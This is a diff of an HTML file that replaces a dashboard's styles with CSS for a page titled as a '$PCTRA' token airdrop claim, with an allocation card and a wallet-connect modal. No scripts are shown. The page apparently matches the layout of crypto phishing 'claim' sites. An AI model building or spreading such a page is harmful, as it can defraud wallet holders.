@@ -3,2423 +3,1066 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mission Control</title>
+<title>Pectra Protocol - Claim Your $PCTRA Airdrop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #0a0a0f; --bg2: #12121a; --bg3: #1a1a25;
-  --border: #2a2a3a; --text: #e0e0e8; --dim: #888899;
-  --green: #00ff88; --red: #ff4466; --blue: #4488ff;
-  --yellow: #ffaa00; --purple: #aa66ff; --cyan: #00cccc;
+  --bg: #0c0c0f;
+  --bg2: #111116;
+  --bg3: #18181d;
+  --card: #1c1c22;
+  --border: rgba(255,255,255,0.08);
+  --primary: #6366f1;
+  --primary-light: #818cf8;
+  --accent: #22d3ee;
+  --green: #10b981;
+  --yellow: #fbbf24;
+  --red: #ef4444;
+  --text: #ffffff;
+  --text-secondary: #a1a1aa;
+  --text-dim: #71717a;
 }
+
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Consolas', 'SF Mono', monospace; background: var(--bg); color: var(--text); font-size: 13px; }
-a { color: var(--blue); text-decoration: none; }
-a:hover { text-decoration: underline; }
 
-/* Layout */
-.top-bar {
-  background: var(--bg2); border-bottom: 1px solid var(--border);
-  padding: 8px 16px; display: flex; align-items: center; gap: 16px;
-  position: sticky; top: 0; z-index: 100;
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  line-height: 1.6;
 }
-.top-bar .logo { font-size: 16px; font-weight: bold; color: var(--green); letter-spacing: 2px; }
-.top-bar .status { margin-left: auto; display: flex; gap: 12px; align-items: center; }
-.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-.dot.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
-.dot.off { background: var(--red); box-shadow: 0 0 6px var(--red); }
 
-/* Tabs */
-.tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); background: var(--bg2); }
-.tab {
-  padding: 10px 20px; cursor: pointer; color: var(--dim);
-  border-bottom: 2px solid transparent; transition: all 0.2s;
+/* Animated gradient background */
+.bg-gradient {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: 
+    radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99, 102, 241, 0.15), transparent),
+    radial-gradient(ellipse 60% 40% at 100% 0%, rgba(34, 211, 238, 0.08), transparent),
+    radial-gradient(ellipse 40% 30% at 0% 100%, rgba(99, 102, 241, 0.1), transparent);
+  pointer-events: none;
+  z-index: -1;
 }
-.tab:hover { color: var(--text); background: var(--bg3); }
-.tab.active { color: var(--green); border-bottom-color: var(--green); }
-.tab-content { display: none; padding: 16px; }
-.tab-content.active { display: block; }
 
-/* Cards */
-.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px; margin-bottom: 16px; }
-.card {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 14px; position: relative;
+/* Header */
+.header {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 100;
+  padding: 16px 32px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: rgba(12, 12, 15, 0.8);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
 }
-.card h3 { font-size: 11px; text-transform: uppercase; color: var(--dim); margin-bottom: 8px; letter-spacing: 1px; }
-.card .value { font-size: 24px; font-weight: bold; }
-.card .sub { font-size: 11px; color: var(--dim); margin-top: 4px; }
-.positive { color: var(--green); }
-.negative { color: var(--red); }
 
-/* Tables */
-table { width: 100%; border-collapse: collapse; font-size: 12px; }
-th { text-align: left; padding: 6px 8px; color: var(--dim); border-bottom: 1px solid var(--border); font-size: 11px; text-transform: uppercase; }
-td { padding: 5px 8px; border-bottom: 1px solid #1a1a25; }
-tr:hover { background: var(--bg3); }
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--text);
+  text-decoration: none;
+}
 
-/* Command bar */
-.cmd-bar {
-  display: flex; gap: 8px; margin-bottom: 16px;
+.logo-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
 }
-.cmd-bar input {
-  flex: 1; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px 14px; color: var(--text); font-family: inherit; font-size: 13px;
-  outline: none;
-}
-.cmd-bar input:focus { border-color: var(--green); }
-.cmd-bar button, .btn {
-  background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 8px 16px; color: var(--text); cursor: pointer; font-family: inherit;
-  font-size: 12px; transition: all 0.15s;
-}
-.cmd-bar button:hover, .btn:hover { border-color: var(--green); color: var(--green); }
-.btn.sm { padding: 4px 10px; font-size: 11px; }
 
-/* Quick actions */
-.quick-actions { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 16px; }
-
-/* Log viewer */
-.log-box {
-  background: #050508; border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px; max-height: 500px; overflow-y: auto; white-space: pre-wrap;
-  font-size: 11px; line-height: 1.5; color: #aab;
+.nav {
+  display: flex;
+  gap: 32px;
 }
-.log-box .err { color: var(--red); }
-.log-box .success { color: var(--green); }
-.log-box .warn { color: var(--yellow); }
 
-/* Task list */
-.task-item {
-  background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px; margin-bottom: 8px;
+.nav a {
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 500;
+  transition: color 0.2s;
 }
-.task-item .task-status { font-size: 11px; padding: 2px 8px; border-radius: 4px; display: inline-block; }
-.task-item .task-status.pending { background: #333; color: var(--yellow); }
-.task-item .task-status.running { background: #1a2a3a; color: var(--blue); }
-.task-item .task-status.done { background: #1a2a1a; color: var(--green); }
-.task-item .task-status.error { background: #2a1a1a; color: var(--red); }
-.task-item .task-status.timeout { background: #2a2a1a; color: var(--yellow); }
-.task-result { margin-top: 8px; font-size: 11px; background: #050508; padding: 8px; border-radius: 4px; white-space: pre-wrap; max-height: 200px; overflow-y: auto; }
 
-/* Session browser */
-.session-item {
-  background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px; margin-bottom: 6px; cursor: pointer;
+.nav a:hover { color: var(--text); }
+
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 16px;
 }
-.session-item:hover { border-color: var(--blue); }
-.session-detail { background: #050508; border-radius: 6px; padding: 12px; margin-top: 8px; max-height: 400px; overflow-y: auto; }
+
+.btn {
+  padding: 12px 24px;
+  border-radius: 12px;
+  font-weight: 600;
+  font-size: 14px;
+  border: none;
+  cursor: pointer;
+  transition: all 0.2s;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.btn-primary {
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: white;
+  box-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
+}
+
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 30px rgba(99, 102, 241, 0.4);
+}
+
+.btn-secondary {
+  background: var(--card);
+  color: var(--text);
+  border: 1px solid var(--border);
+}
+
+.btn-secondary:hover {
+  background: var(--bg3);
+  border-color: var(--primary);
+}
+
+/* Main Content */
+.main {
+  padding-top: 120px;
+  min-height: 100vh;
+}
+
+/* Hero Section */
+.hero {
+  text-align: center;
+  padding: 60px 24px 80px;
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 16px;
+  background: rgba(99, 102, 241, 0.1);
+  border: 1px solid rgba(99, 102, 241, 0.2);
+  border-radius: 100px;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--primary-light);
+  margin-bottom: 24px;
+}
+
+.badge .dot {
+  width: 8px;
+  height: 8px;
+  background: var(--green);
+  border-radius: 50%;
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.5; transform: scale(1.2); }
+}
+
+.hero h1 {
+  font-size: 56px;
+  font-weight: 800;
+  line-height: 1.1;
+  margin-bottom: 20px;
+  background: linear-gradient(135deg, #fff 30%, var(--primary-light) 70%, var(--accent) 100%);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.hero p {
+  font-size: 18px;
+  color: var(--text-secondary);
+  max-width: 560px;
+  margin: 0 auto 40px;
+}
+
+/* Claim Card */
+.claim-section {
+  max-width: 520px;
+  margin: 0 auto;
+  padding: 0 24px;
+}
+
+.claim-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 24px;
+  padding: 32px;
+  text-align: center;
+}
+
+.claim-card h2 {
+  font-size: 18px;
+  font-weight: 600;
+  margin-bottom: 24px;
+  color: var(--text-secondary);
+}
+
+.allocation-amount {
+  font-size: 48px;
+  font-weight: 800;
+  background: linear-gradient(135deg, var(--accent) 0%, var(--primary-light) 100%);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 8px;
+}
+
+.allocation-usd {
+  font-size: 16px;
+  color: var(--text-dim);
+  margin-bottom: 32px;
+}
+
+.eligibility-status {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 12px 20px;
+  background: rgba(16, 185, 129, 0.1);
+  border: 1px solid rgba(16, 185, 129, 0.2);
+  border-radius: 12px;
+  color: var(--green);
+  font-weight: 500;
+  margin-bottom: 24px;
+}
+
+.eligibility-status.pending {
+  background: rgba(251, 191, 36, 0.1);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: var(--yellow);
+}
+
+.claim-btn {
+  width: 100%;
+  padding: 16px 24px;
+  font-size: 16px;
+  border-radius: 16px;
+}
+
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin: 24px 0;
+  color: var(--text-dim);
+  font-size: 13px;
+}
+
+.divider::before,
+.divider::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.wallet-info {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 12px;
+  background: var(--bg3);
+  border-radius: 12px;
+  font-family: monospace;
+  font-size: 14px;
+  color: var(--text-secondary);
+}
+
+/* Stats Section */
+.stats-section {
+  max-width: 900px;
+  margin: 60px auto;
+  padding: 0 24px;
+}
+
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+}
+
+.stat-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 24px;
+  text-align: center;
+}
+
+.stat-value {
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 4px;
+}
+
+.stat-label {
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+/* Timeline */
+.timeline-section {
+  max-width: 700px;
+  margin: 80px auto;
+  padding: 0 24px;
+}
+
+.timeline-section h2 {
+  text-align: center;
+  font-size: 28px;
+  margin-bottom: 40px;
+}
+
+.timeline {
+  position: relative;
+  padding-left: 32px;
+}
+
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 7px;
+  top: 8px;
+  bottom: 8px;
+  width: 2px;
+  background: linear-gradient(to bottom, var(--primary), var(--accent));
+}
+
+.timeline-item {
+  position: relative;
+  padding-bottom: 32px;
+}
+
+.timeline-item::before {
+  content: '';
+  position: absolute;
+  left: -32px;
+  top: 6px;
+  width: 16px;
+  height: 16px;
+  background: var(--primary);
+  border-radius: 50%;
+  border: 3px solid var(--bg);
+}
+
+.timeline-item.active::before {
+  background: var(--green);
+  box-shadow: 0 0 20px var(--green);
+}
+
+.timeline-item.upcoming::before {
+  background: var(--text-dim);
+}
+
+.timeline-date {
+  font-size: 13px;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+
+.timeline-title {
+  font-size: 16px;
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+
+.timeline-desc {
+  font-size: 14px;
+  color: var(--text-secondary);
+}
+
+/* FAQ */
+.faq-section {
+  max-width: 700px;
+  margin: 80px auto;
+  padding: 0 24px 80px;
+}
+
+.faq-section h2 {
+  text-align: center;
+  font-size: 28px;
+  margin-bottom: 40px;
+}
+
+.faq-item {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 20px 24px;
+  margin-bottom: 12px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.faq-item:hover {
+  border-color: var(--primary);
+}
+
+.faq-question {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-weight: 600;
+}
+
+.faq-answer {
+  display: none;
+  margin-top: 16px;
+  color: var(--text-secondary);
+  font-size: 14px;
+  line-height: 1.7;
+}
+
+.faq-item.open .faq-answer {
+  display: block;
+}
+
+/* Footer */
+.footer {
+  background: var(--bg2);
+  border-top: 1px solid var(--border);
+  padding: 40px 24px;
+  text-align: center;
+}
+
+.footer-links {
+  display: flex;
+  justify-content: center;
+  gap: 32px;
+  margin-bottom: 20px;
+}
+
+.footer-links a {
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.footer-links a:hover { color: var(--text); }
+
+.footer-socials {
+  display: flex;
+  justify-content: center;
+  gap: 16px;
+  margin-bottom: 20px;
+}
+
+.footer-socials a {
+  width: 40px;
+  height: 40px;
+  background: var(--card);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--text-secondary);
+  text-decoration: none;
+  transition: all 0.2s;
+}
+
+.footer-socials a:hover {
+  background: var(--primary);
+  color: white;
+}
+
+.footer-copy {
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+/* Modal */
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0, 0, 0, 0.8);
+  backdrop-filter: blur(8px);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+  padding: 24px;
+}
+
+.modal-overlay.open { display: flex; }
+
+.modal {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 24px;
+  padding: 32px;
+  max-width: 420px;
+  width: 100%;
+  position: relative;
+}
+
+.modal-close {
+  position: absolute;
+  top: 16px;
+  right: 16px;
+  width: 32px;
+  height: 32px;
+  background: var(--bg3);
+  border: none;
+  border-radius: 8px;
+  color: var(--text-secondary);
+  cursor: pointer;
+  font-size: 18px;
+}
+
+.modal h2 {
+  font-size: 24px;
+  margin-bottom: 8px;
+}
+
+.modal p {
+  color: var(--text-secondary);
+  margin-bottom: 24px;
+  font-size: 14px;
+}
+
+.wallet-options {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.wallet-btn {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.2s;
+  color: var(--text);
+  font-size: 15px;
+  font-weight: 500;
+  width: 100%;
+}
+
+.wallet-btn:hover {
+  border-color: var(--primary);
+  background: rgba(99, 102, 241, 0.1);
+}
+
+.wallet-btn img {
+  width: 28px;
+  height: 28px;
+  border-radius: 6px;
+}
+
+.wallet-icon {
+  width: 28px;
+  height: 28px;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 700;
+  font-size: 14px;
+}
+
+.spinner {
+  width: 40px;
+  height: 40px;
+  border: 3px solid var(--bg3);
+  border-top-color: var(--primary);
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 24px auto;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.step { display: none; text-align: center; }
+.step.active { display: block; }
+
+/* Connected Badge */
+.connected-badge {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 16px;
+  background: rgba(16, 185, 129, 0.1);
+  border: 1px solid rgba(16, 185, 129, 0.2);
+  border-radius: 100px;
+  color: var(--green);
+  font-size: 13px;
+  font-weight: 500;
+}
+
+.connected-badge::before {
+  content: '';
+  width: 8px;
+  height: 8px;
+  background: var(--green);
+  border-radius: 50%;
+}
 
 /* Responsive */
 @media (max-width: 768px) {
-  .grid { grid-template-columns: 1fr; }
-  .tab { padding: 8px 12px; font-size: 12px; }
-  .kanban { flex-direction: column; }
-  .kanban-col { min-width: 100%; }
+  .hero h1 { font-size: 36px; }
+  .stats-grid { grid-template-columns: repeat(2, 1fr); }
+  .nav { display: none; }
+  .allocation-amount { font-size: 36px; }
 }
-
-/* Kanban Board */
-.kanban { display: flex; gap: 12px; min-height: 500px; overflow-x: auto; padding-bottom: 8px; }
-.kanban-col {
-  flex: 1; min-width: 260px; background: var(--bg2); border: 1px solid var(--border);
-  border-radius: 8px; display: flex; flex-direction: column;
-}
-.kanban-col-header {
-  padding: 10px 12px; border-bottom: 1px solid var(--border);
-  font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
-  display: flex; align-items: center; gap: 8px;
-}
-.kanban-col-header .count { background: var(--bg3); padding: 2px 8px; border-radius: 10px; font-size: 10px; }
-.kanban-col-body { flex: 1; padding: 8px; overflow-y: auto; min-height: 100px; }
-.kanban-card {
-  background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 10px; margin-bottom: 8px; cursor: grab; transition: border-color 0.15s;
-}
-.kanban-card:hover { border-color: var(--blue); }
-.kanban-card.dragging { opacity: 0.5; }
-.kanban-card .card-title { font-size: 12px; font-weight: bold; margin-bottom: 4px; }
-.kanban-card .card-desc { font-size: 11px; color: var(--dim); margin-bottom: 6px; }
-.kanban-card .card-meta { display: flex; gap: 6px; align-items: center; font-size: 10px; }
-.badge { padding: 1px 6px; border-radius: 4px; font-size: 10px; }
-.badge.user { background: #2a1a3a; color: var(--purple); }
-.badge.clawd { background: #1a2a1a; color: var(--green); }
-.badge.urgent { background: #3a1a1a; color: var(--red); }
-.badge.high { background: #3a2a1a; color: var(--yellow); }
-.badge.medium { background: #1a2a3a; color: var(--blue); }
-.badge.low { background: #1a1a2a; color: var(--dim); }
-.kanban-col.drag-over { background: var(--bg3); }
-
-/* Calendar */
-.cal-grid { display: grid; grid-template-columns: repeat(7, 1fr); gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
-.cal-header { background: var(--bg2); padding: 8px; text-align: center; font-size: 11px; color: var(--dim); text-transform: uppercase; }
-.cal-day { background: var(--bg); padding: 6px; min-height: 80px; font-size: 11px; cursor: pointer; transition: background .15s; }
-.cal-day:hover { background: var(--bg2); }
-.cal-day .day-num { color: var(--dim); font-size: 10px; margin-bottom: 4px; }
-.cal-day.today { background: var(--bg2); border: 1px solid var(--cyan); }
-.cal-day.has-plan .day-num { color: var(--cyan); font-weight: bold; }
-.cal-event { padding: 2px 4px; border-radius: 3px; font-size: 9px; margin-bottom: 2px; cursor: default; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.cal-event.cron { background: #1a2a1a; color: var(--green); border-left: 2px solid var(--green); }
-.cal-event.task { background: #1a1a3a; color: var(--blue); border-left: 2px solid var(--blue); }
-.cal-event.plan-dot { background: none; color: var(--dim); font-size: 8px; padding: 0; }
-.cal-plan-bar { height: 3px; border-radius: 2px; margin-top: 4px; overflow: hidden; background: var(--border); }
-.cal-plan-bar .fill { height: 100%; border-radius: 2px; transition: width .3s; }
-.cron-list-item { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px; }
-.cron-schedule { font-family: monospace; color: var(--cyan); font-size: 12px; }
-
-/* Day Planner Timeline */
-.day-plan-overlay { position: fixed; top:0;left:0;right:0;bottom:0; background: rgba(0,0,0,.7); z-index: 1000; display:none; justify-content:center; align-items:flex-start; padding-top: 40px; overflow-y: auto; }
-.day-plan-overlay.open { display: flex; }
-.day-plan-panel { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; width: 700px; max-width: 95vw; max-height: 85vh; overflow-y: auto; padding: 24px; }
-.day-plan-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
-.day-plan-header h2 { margin: 0; font-size: 16px; color: var(--cyan); }
-.day-plan-progress { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
-.day-plan-progress .bar { flex: 1; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; }
-.day-plan-progress .bar .fill { height: 100%; background: var(--green); border-radius: 3px; transition: width .3s; }
-.day-plan-progress .pct { color: var(--green); font-size: 13px; font-weight: bold; min-width: 40px; text-align: right; }
-.plan-timeline { position: relative; padding-left: 60px; }
-.plan-hour-label { position: absolute; left: 0; color: var(--dim); font-size: 10px; font-family: monospace; width: 48px; text-align: right; }
-.plan-item { position: relative; margin-bottom: 4px; padding: 8px 12px; border-radius: 6px; border-left: 3px solid var(--border); background: var(--bg3); transition: border-color .15s, background .15s; }
-.plan-item:hover { background: var(--bg); }
-.plan-item.type-cron { border-left-color: var(--green); }
-.plan-item.type-task { border-left-color: var(--blue); }
-.plan-item.type-milestone { border-left-color: var(--yellow); }
-.plan-item.type-auto { border-left-color: #aa66ff; }
-.plan-item.status-done { opacity: .6; }
-.plan-item.status-done::after { content: '✓'; position: absolute; right: 12px; top: 8px; color: var(--green); font-size: 14px; }
-.plan-item.status-running { border-left-color: var(--cyan); animation: statusPulse 2s infinite; }
-.plan-item.status-error { border-left-color: var(--red); }
-.plan-item .pi-time { font-family: monospace; font-size: 11px; color: var(--cyan); margin-right: 8px; }
-.plan-item .pi-title { font-size: 12px; color: var(--text); font-weight: 600; }
-.plan-item .pi-desc { font-size: 10px; color: var(--dim); margin-top: 3px; }
-.plan-item .pi-type { font-size: 9px; padding: 1px 6px; border-radius: 3px; margin-left: 8px; text-transform: uppercase; }
-.pi-type.cron { background: #1a2a1a; color: var(--green); }
-.pi-type.task { background: #1a1a3a; color: var(--blue); }
-.pi-type.milestone { background: #2a2a1a; color: var(--yellow); }
-.pi-type.auto { background: #1a1a2a; color: #aa66ff; }
-.plan-stats { display: flex; gap: 16px; margin-bottom: 12px; flex-wrap: wrap; }
-.plan-stat { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; text-align: center; }
-.plan-stat .val { font-size: 20px; font-weight: bold; }
-.plan-stat .lbl { font-size: 9px; color: var(--dim); text-transform: uppercase; }
-.plan-stat.s-total .val { color: var(--cyan); }
-.plan-stat.s-done .val { color: var(--green); }
-.plan-stat.s-running .val { color: var(--yellow); }
-.plan-stat.s-cron .val { color: var(--green); }
-.plan-stat.s-tasks .val { color: var(--blue); }
-
-/* Projects */
-.project-card {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 16px; margin-bottom: 12px; cursor: pointer; transition: border-color 0.15s;
-}
-.project-card:hover { border-color: var(--blue); }
-.project-card .proj-name { font-size: 16px; font-weight: bold; margin-bottom: 4px; }
-.project-card .proj-desc { font-size: 12px; color: var(--dim); margin-bottom: 10px; }
-.progress-bar { height: 6px; background: var(--bg3); border-radius: 3px; overflow: hidden; }
-.progress-fill { height: 100%; border-radius: 3px; transition: width 0.3s; }
-.proj-stats { display: flex; gap: 16px; margin-top: 8px; font-size: 11px; color: var(--dim); }
-
-/* Activity Feed */
-.activity-feed { max-height: 600px; overflow-y: auto; }
-.activity-item { padding: 6px 0; border-bottom: 1px solid #1a1a25; font-size: 11px; display: flex; gap: 8px; align-items: flex-start; }
-.activity-item .act-time { color: var(--dim); white-space: nowrap; min-width: 60px; }
-.activity-item .act-icon { width: 18px; text-align: center; }
-.activity-item .act-detail { flex: 1; }
-
-/* AI Task Cards */
-.ai-task-card {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 12px; margin-bottom: 8px; cursor: pointer; transition: border-color 0.15s;
-}
-.ai-task-card:hover { border-color: var(--blue); }
-.ai-task-card .atc-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
-.ai-task-card .atc-status {
-  font-size: 10px; padding: 2px 8px; border-radius: 10px; font-weight: bold; text-transform: uppercase;
-}
-.ai-task-card .atc-status.pending { background: #1a1a2e; color: var(--dim); }
-.ai-task-card .atc-status.running { background: #1a2a1a; color: var(--green); animation: statusPulse 1.5s ease-in-out infinite; }
-.ai-task-card .atc-status.done { background: #0d1a2e; color: var(--blue); }
-.ai-task-card .atc-status.error { background: #2e0d0d; color: var(--red); }
-.ai-task-card .atc-status.timeout { background: #2e1a0d; color: var(--yellow); }
-.ai-task-card .atc-msg { font-size: 12px; margin-bottom: 6px; }
-.ai-task-card .atc-preview { font-size: 11px; color: var(--dim); padding: 6px 8px; background: var(--bg3); border-radius: 4px; white-space: pre-wrap; max-height: 60px; overflow: hidden; font-family: 'JetBrains Mono', monospace; }
-.ai-task-card .atc-time { font-size: 10px; color: var(--dim); }
-@keyframes statusPulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
-.ai-task-card .atc-thinking {
-  display: inline-flex; align-items: center; gap: 4px; font-size: 10px; color: var(--green);
-}
-.ai-task-card .atc-thinking .dot-anim span {
-  display: inline-block; width: 4px; height: 4px; border-radius: 50%; background: var(--green);
-  animation: dotBounce 1.4s ease-in-out infinite;
-}
-.ai-task-card .atc-thinking .dot-anim span:nth-child(2) { animation-delay: 0.2s; }
-.ai-task-card .atc-thinking .dot-anim span:nth-child(3) { animation-delay: 0.4s; }
-@keyframes dotBounce { 0%,80%,100% { opacity:0.3; } 40% { opacity:1; } }
-
-/* New task modal */
-.modal-overlay {
-  display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0,0,0,0.7); z-index: 200; justify-content: center; align-items: center;
-}
-.modal-overlay.show { display: flex; }
-.modal {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
-  padding: 20px; width: 420px; max-width: 90vw;
-}
-.modal h3 { margin-bottom: 12px; color: var(--green); }
-.modal label { display: block; margin-bottom: 4px; font-size: 11px; color: var(--dim); }
-.modal input, .modal textarea, .modal select {
-  width: 100%; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 8px 10px; color: var(--text); font-family: inherit; font-size: 12px;
-  margin-bottom: 10px; outline: none;
-}
-.modal textarea { min-height: 60px; resize: vertical; }
-.modal input:focus, .modal textarea:focus, .modal select:focus { border-color: var(--green); }
-.modal-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 8px; }
-
-/* Memory Screen */
-.memory-layout { display: grid; grid-template-columns: 280px 1fr; gap: 16px; min-height: 600px; }
-.memory-sidebar { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; overflow-y: auto; max-height: 80vh; }
-.memory-sidebar .mem-date-item {
-  padding: 10px 14px; cursor: pointer; border-bottom: 1px solid var(--border);
-  transition: background 0.15s;
-}
-.memory-sidebar .mem-date-item:hover { background: var(--bg3); }
-.memory-sidebar .mem-date-item.active { background: var(--bg3); border-left: 3px solid var(--green); }
-.memory-sidebar .mem-date-label { font-size: 13px; font-weight: bold; }
-.memory-sidebar .mem-date-sub { font-size: 10px; color: var(--dim); margin-top: 2px; }
-.memory-viewer {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 20px; overflow-y: auto; max-height: 80vh;
-}
-.memory-viewer .mem-content { white-space: pre-wrap; font-size: 12px; line-height: 1.7; }
-.memory-viewer h2 { color: var(--green); margin-bottom: 12px; font-size: 16px; }
-.mem-tab-row { display: flex; gap: 0; margin-bottom: 16px; border-bottom: 1px solid var(--border); }
-.mem-tab-row .mem-tab {
-  padding: 8px 16px; cursor: pointer; color: var(--dim); font-size: 12px;
-  border-bottom: 2px solid transparent; transition: all 0.15s;
-}
-.mem-tab-row .mem-tab:hover { color: var(--text); }
-.mem-tab-row .mem-tab.active { color: var(--cyan); border-bottom-color: var(--cyan); }
-
-/* Docs Screen */
-.docs-toolbar { display: flex; gap: 8px; margin-bottom: 16px; align-items: center; }
-.docs-toolbar input {
-  flex: 1; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
-  padding: 8px 14px; color: var(--text); font-family: inherit; font-size: 13px; outline: none;
-}
-.docs-toolbar input:focus { border-color: var(--cyan); }
-.docs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 12px; }
-.doc-card {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 14px; cursor: pointer; transition: border-color 0.15s;
-}
-.doc-card:hover { border-color: var(--cyan); }
-.doc-card .doc-title { font-size: 13px; font-weight: bold; color: var(--text); margin-bottom: 4px; word-break: break-all; }
-.doc-card .doc-meta { font-size: 10px; color: var(--dim); display: flex; gap: 10px; margin-bottom: 8px; }
-.doc-card .doc-preview { font-size: 11px; color: var(--dim); line-height: 1.5; max-height: 60px; overflow: hidden; }
-.doc-badge { display: inline-block; padding: 1px 8px; border-radius: 4px; font-size: 10px; margin-right: 6px; }
-.doc-badge.MD { background: #1a2a3a; color: var(--blue); }
-.doc-badge.JSON { background: #2a2a1a; color: var(--yellow); }
-.doc-badge.TXT { background: #1a2a1a; color: var(--green); }
-.doc-badge.HTML { background: #2a1a2a; color: var(--purple); }
-.doc-badge.LOG { background: #2a1a1a; color: var(--red); }
